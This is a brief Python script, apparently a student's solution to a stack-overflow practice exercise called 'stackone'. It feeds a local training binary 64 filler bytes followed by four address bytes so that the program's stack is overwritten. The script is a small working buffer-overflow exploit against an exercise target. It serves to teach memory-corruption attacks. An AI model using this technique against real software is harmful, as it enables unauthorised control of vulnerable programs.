# Troy Crawford
# 8/11/2021
# Stackone - Exploit Excerices
 
from subprocess import Popen, PIPE
 
buffer_len = 64
 
# Popen opens up executable, place filler characters for the length of the buffer, then add on the address of the function to call. 
# Being within the brackets is what is equivalent to the command line. This is taken as arguments and not a string.
p = Popen(["/home/troy/Documents/probsets/stackone.c.o", 'x'*buffer_len + '\x62\x59\x6c\x49'], stdin=PIPE, stdout=PIPE, stderr=PIPE)

output = p.communicate()
print(output)